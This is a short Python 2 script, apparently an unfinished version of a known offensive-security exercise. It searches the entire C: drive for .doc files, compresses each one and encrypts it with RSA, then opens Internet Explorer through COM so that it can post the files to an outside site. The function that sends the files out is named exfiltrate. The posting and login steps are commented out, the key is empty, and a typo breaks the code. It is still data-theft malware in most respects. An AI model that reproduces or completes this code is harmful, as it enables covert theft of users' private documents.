import win32com.client
import os
import fnmatch
import time,random,zlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type=".doc"
public_key=''

def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)
    return
def encrypt_string(plaintext):
    chunk_size=256
    print 'Compressing: %d bytes'%len(plaintext)
    plaintext=zlib.compress(plaintext)
    print 'Encrypting %d bytes'%len(plaintext)
    rsakey=RSA.importKey(public_key)
    rsakey=PKCS1_OAEP.new(rsakey)
    encrypted=''
    offset=0
    while offset<len(plaintext):
        chunk=plaintext[offset:offset+chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += ' '*(chunk_size-len(chunk))
        encrypted+=rsakey.encrypt(chunk)
        offset+=chunk_size
    encrypted=encrypted.encode('base64')    
    print 'Base64 encode crypto:%d'%len(encrypted)
    return encrypted
def encrypt_post(filename):
    fd=open(filename,'rb')
    contents=fd.read()
    fd.close()
    encrypted_title=encrypt_string(filename)
    encrypted_body=encrypt_string(cotents)
    return encrypted_title,encrypted_body
def random_sleep():
    time.sleep(random.randint(5,10))
    return
#def login():
#def post_to():
def exfiltrate(document_path):
    ie=win32com.client.Dispatch('InternetExplorer.Application')
    ie.Visible=1
    #ie.Navigate('')
    wait_for_browser(ie)
    title,body=encrypt_post(document_path)
    #post_to()
    ie.Quit()
    ie=None
    return

for parent,directories,filenames in os.walk('C:\\'):
    for filename in fnmatch.filter(filenames,"*%s"%doc_type):
        document_path=os.path.join(parent,filename)
        print "Found: %s"%document_path
        exfiltrate(document_path)
        raw_input('Continue?')
        

            